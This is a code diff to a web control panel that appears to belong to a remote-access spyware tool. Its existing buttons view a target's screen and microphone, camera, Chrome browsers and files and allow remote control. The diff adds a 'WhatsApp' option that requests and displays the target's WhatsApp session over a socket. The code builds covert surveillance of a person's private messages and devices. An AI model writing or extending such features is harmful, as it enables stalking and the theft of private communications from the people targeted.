@@ -22,6 +22,7 @@
         <button id="viewScreenMicBtn" style="background: #e83e8c;">🖥️+🎙️ Screen & Mic</button>
         <button id="remoteControlBtn" style="background: #dc3545;">🎮 Remote Control</button>
         <button id="viewChromeBtn" style="background: #ff7300;">🌐 Chrome Browsers</button>
+        <button id="viewWhatsappBtn" style="background: #25D366; color: white;">💬 WhatsApp</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
         <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
@@ -160,7 +161,7 @@
 
         function stopCurrentActive() {
             document.getElementById('chrome-list-container').classList.add('hidden');
-            if (activeType === 'screen' || activeType === 'remote' || activeType === 'screen-mic' || activeType === 'chrome') {
+            if (activeType === 'screen' || activeType === 'remote' || activeType === 'screen-mic' || activeType === 'chrome' || activeType === 'whatsapp') {
                 socket.emit('stop-screen', activeTarget);
                 document.getElementById('remote-tools').classList.add('hidden');
                 if (peerConnection) peerConnection.close();
@@ -265,6 +266,23 @@
                 };
                 container.appendChild(btn);
             });
+        });
+
+        document.getElementById('viewWhatsappBtn').onclick = () => {
+            if (activeType === 'whatsapp') return;
+            stopCurrentActive();
+            activeType = 'whatsapp';
+            document.getElementById('preview-video').classList.remove('hidden');
+            document.getElementById('preview-video').muted = false;
+            document.getElementById('title').innerText = "Viewing WhatsApp: " + activeTarget;
+            socket.emit('request-whatsapp', activeTarget);
+        };
+
+        socket.on('whatsapp-error', (err) => {
+            alert(err);
+            stopCurrentActive();
+            document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('title').innerText = "Viewing Options for: " + activeTarget;
         });
 
         document.getElementById('listenMicBtn').onclick = () => {
